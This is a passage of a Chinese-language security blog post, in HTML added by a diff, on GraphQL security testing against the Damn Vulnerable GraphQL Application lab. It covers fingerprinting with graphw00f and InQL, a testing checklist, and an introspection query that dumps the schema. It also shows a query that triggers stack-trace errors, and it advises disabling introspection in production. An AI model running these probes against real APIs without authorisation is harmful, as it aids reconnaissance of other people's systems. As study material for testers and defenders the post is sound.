@@ -1,0 +1,1428 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="GraphQL安全">
+<title>GraphQL安全</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/graphql%E5%AE%89%E5%85%A8/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="GraphQL安全">
+<meta property='og:description' content="GraphQL安全">
+<meta property='og:url' content='https://lserein.github.io/p/graphql%E5%AE%89%E5%85%A8/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-04T10:14:34&#43;08:00'/><meta property='article:modified_time' content='2026-01-05T16:41:17&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/graphql%E5%AE%89%E5%85%A8/logo.jpg' />
+<meta name="twitter:title" content="GraphQL安全">
+<meta name="twitter:description" content="GraphQL安全"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/graphql%E5%AE%89%E5%85%A8/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huc83695a2748b8374c632d172527a7db7_35249_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1graphql基础知识">1.GraphQL基础知识</a>
+      <ol>
+        <li><a href="#11什么是graphql">1.1.什么是GraphQL</a></li>
+        <li><a href="#12核心概念">1.2.核心概念</a></li>
+      </ol>
+    </li>
+    <li><a href="#2graphql指纹识别">2.GraphQL指纹识别</a></li>
+    <li><a href="#3graphql安全问题">3.GraphQL安全问题</a>
+      <ol>
+        <li><a href="#31信息泄露攻击">3.1.信息泄露攻击</a>
+          <ol>
+            <li><a href="#1-introspection内省泄露">1. Introspection（内省）泄露</a></li>
+            <li><a href="#2graphiql接口泄露">2.graphiql接口泄露</a></li>
+            <li><a href="#3graphql堆栈错误">3.GraphQL堆栈错误</a></li>
+            <li><a href="#4ssrf漏洞">4.SSRF漏洞</a></li>
+            <li><a href="#5代码执行漏洞">5.代码执行漏洞</a></li>
+            <li><a href="#6存储型xss漏洞">6.存储型XSS漏洞</a></li>
+            <li><a href="#7sql注入漏洞">7.SQL注入漏洞</a></li>
+            <li><a href="#8拒绝服务攻击ddos">8.拒绝服务攻击DDOS</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#4llm-graphql">4.LLM-GraphQL</a></li>
+    <li><a href="#-功能特性">🔍 功能特性</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/graphql%E5%AE%89%E5%85%A8/">
+                <img src="/p/graphql%E5%AE%89%E5%85%A8/logo_hub20bbea5694ca3a59339a693ae8ca887_27460_800x0_resize_q75_box.jpg"
+                        srcset="/p/graphql%E5%AE%89%E5%85%A8/logo_hub20bbea5694ca3a59339a693ae8ca887_27460_800x0_resize_q75_box.jpg 800w, /p/graphql%E5%AE%89%E5%85%A8/logo_hub20bbea5694ca3a59339a693ae8ca887_27460_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="429" 
+                        loading="lazy"
+                        alt="Featured image of post GraphQL安全" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/web%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                Web安全
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/graphql%E5%AE%89%E5%85%A8/">GraphQL安全</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            GraphQL安全
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 04, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>参考资料：</p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/-nR9YNFpw5a1FuRSZOf4Vw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/-nR9YNFpw5a1FuRSZOf4Vw</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA</a></p>
+<p><a class="link" href="https://www.yuque.com/henry-weply/penetration/ps5n3g#wERbE"  target="_blank" rel="noopener"
+    >https://www.yuque.com/henry-weply/penetration/ps5n3g#wERbE</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/14350"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/14350</a></p>
+<p>靶场项目地址：https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application</p>
+<h2 id="1graphql基础知识">1.GraphQL基础知识
+</h2><h3 id="11什么是graphql">1.1.什么是GraphQL
+</h3><ol>
+<li>GraphQL 是由 Facebook 开发的一种用于 API 的查询语言和运行时。</li>
+<li>客户端可以精确指定所需数据，避免过度获取（over-fetching）或获取不足（under-fetching）。</li>
+<li>与 REST 不同，GraphQL 通常通过单一端点（如 <code>/graphql</code>）接收所有请求。</li>
+</ol>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/1.png"
+	width="2542"
+	height="954"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/1_hu7d34338f5d0534a6cbd3b7e64a4ed3b8_274422_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/1_hu7d34338f5d0534a6cbd3b7e64a4ed3b8_274422_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="639px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">REST示例</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">1</span><span class="w">          </span><span class="n">查询ID为1的用户信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">list</span><span class="w">       </span><span class="n">列出所有用户</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">goods</span><span class="o">/</span><span class="n">1</span><span class="w">          </span><span class="n">查询ID为1的商品</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GraphQL示例</span><span class="err">：</span><span class="n">通常为POST请求</span><span class="err">，</span><span class="n">Body为Json数据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">graphql</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;query&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;query { user(id: \&#34;1\&#34;) { name email } }&#34;</span><span class="w">   </span><span class="c1">//查询id为1的用户信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="12核心概念">1.2.核心概念
+</h3><ol>
+<li>Query：用于读取数据（类似 GET 请求）。</li>
+<li>Mutation：用于写入/修改数据（类似 POST/PUT/DELETE）。</li>
+<li>Schema：定义了 API 支持的类型、字段、查询和变更。</li>
+<li>Resolver：服务端函数，用于解析每个字段的数据来源。</li>
+</ol>
+<h2 id="2graphql指纹识别">2.GraphQL指纹识别
+</h2><ol>
+<li>通过数据包查看</li>
+</ol>
+<p>请求端点相同且请求体为Json格式，内容为</p>
+<p>{</p>
+<p>&ldquo;query&rdquo;: &ldquo;query { user(id: &quot;1&quot;) { name email } }&rdquo;</p>
+<p>}</p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/2.png"
+	width="2560"
+	height="982"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/2_huacbe9b8478b9d0c09858cef2f5e0bb12_282716_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/2_huacbe9b8478b9d0c09858cef2f5e0bb12_282716_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="625px"
+	
+></p>
+<ol>
+<li>通过工具graphw00f判断</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">python</span><span class="w"> </span><span class="n">main</span><span class="p">.</span><span class="na">py</span><span class="w"> </span><span class="o">--</span><span class="n">proxy</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:8080 -t http://192.168.242.215:5013/graphql -f</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/3.png"
+	width="1999"
+	height="929"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/3_hu51f1e0923f74bbf67e9350024e99af71_108625_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/3_hu51f1e0923f74bbf67e9350024e99af71_108625_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="516px"
+	
+></p>
+<ol>
+<li>通过Burp插件InQL分析</li>
+</ol>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/4.png"
+	width="2413"
+	height="1059"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/4_hu1adc848958d01f854c9839fb52fc2678_309200_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/4_hu1adc848958d01f854c9839fb52fc2678_309200_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="546px"
+	
+></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/5.png"
+	width="1983"
+	height="1021"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/5_hu24c4b16dd58ba2f51834c6e46c99df27_98725_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/5_hu24c4b16dd58ba2f51834c6e46c99df27_98725_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="194"
+		data-flex-basis="466px"
+	
+></p>
+<h2 id="3graphql安全问题">3.GraphQL安全问题
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">是否存在</span><span class="w"> </span><span class="o">/</span><span class="n">graphql</span><span class="err">、</span><span class="o">/</span><span class="n">graphiql</span><span class="err">、</span><span class="o">/</span><span class="n">playground</span><span class="w"> </span><span class="n">等端点</span><span class="err">？</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Introspection</span><span class="w"> </span><span class="n">是否开启</span><span class="err">？</span><span class="n">能否获取完整</span><span class="w"> </span><span class="n">Schema</span><span class="err">？</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">能否通过字段猜测访问敏感数据</span><span class="err">（</span><span class="n">如</span><span class="w"> </span><span class="n">email</span><span class="p">,</span><span class="w"> </span><span class="n">phone</span><span class="p">,</span><span class="w"> </span><span class="n">role</span><span class="p">,</span><span class="w"> </span><span class="n">passwordHash</span><span class="err">）？</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">是否存在深度嵌套或循环查询导致</span><span class="w"> </span><span class="n">DoS</span><span class="err">？</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Mutation</span><span class="w"> </span><span class="n">是否缺乏权限校验</span><span class="err">（</span><span class="n">如删除他人数据</span><span class="err">）？</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">错误信息是否泄露内部逻辑</span><span class="err">？</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">是否对查询频率</span><span class="o">/</span><span class="n">复杂度有限制</span><span class="err">？</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="31信息泄露攻击">3.1.信息泄露攻击
+</h3><h4 id="1-introspection内省泄露">1. Introspection（内省）泄露
+</h4><p>GraphQL 默认开启内省功能（可通过 __schema 查询整个 Schema）。攻击者可借此了解 API 结构，发现敏感字段或未公开接口。相当于<strong>REST API 中 的</strong>Swagger接口文档泄露</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">__schema</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">types</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">fields</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">type</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/6.png"
+	width="2560"
+	height="1062"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/6_hu9d329166ca09675f9622020cd99f95a4_168711_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/6_hu9d329166ca09675f9622020cd99f95a4_168711_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="578px"
+	
+></p>
+<p><strong>利用泄露的API结构在查询可能存在的敏感信息</strong></p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/7.png"
+	width="2340"
+	height="913"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/7_hu1f35db304fae03a6bb3d63782efddc5a_138308_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/7_hu1f35db304fae03a6bb3d63782efddc5a_138308_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="615px"
+	
+></p>
+<p>解决方案：<strong>建议在生产环境中禁用内省查询</strong>，以此避免数据泄露风险。</p>
+<h4 id="2graphiql接口泄露">2.graphiql接口泄露
+</h4><p>GraphQL 内置了一款名为 <strong>GraphiQL</strong>的集成开发环境，它能够提供友好的可视化操作界面，帮助开发者编写和调试 GraphQL 查询语句。</p>
+<p>GraphiQL 的访问路径通常为 <code>/graphiql</code> ，<code>/console</code>，/playground</p>
+<p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/8.png"
+	width="2511"
+	height="828"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/8_hu92e2a721531e4658ee438054580c70e5_107842_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/8_hu92e2a721531e4658ee438054580c70e5_107842_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="303"
+		data-flex-basis="727px"
+	
+></p>
+<h4 id="3graphql堆栈错误">3.GraphQL堆栈错误
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">query</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">system</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/graphql%E5%AE%89%E5%85%A8/image/9.png"
+	width="2560"
+	height="1279"
+	srcset="/p/graphql%E5%AE%89%E5%85%A8/image/9_hua202cfdcf6d2c3de274455f21ede3c18_428437_480x0_resize_box_3.png 480w, /p/graphql%E5%AE%89%E5%85%A8/image/9_hua202cfdcf6d2c3de274455f21ede3c18_428437_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
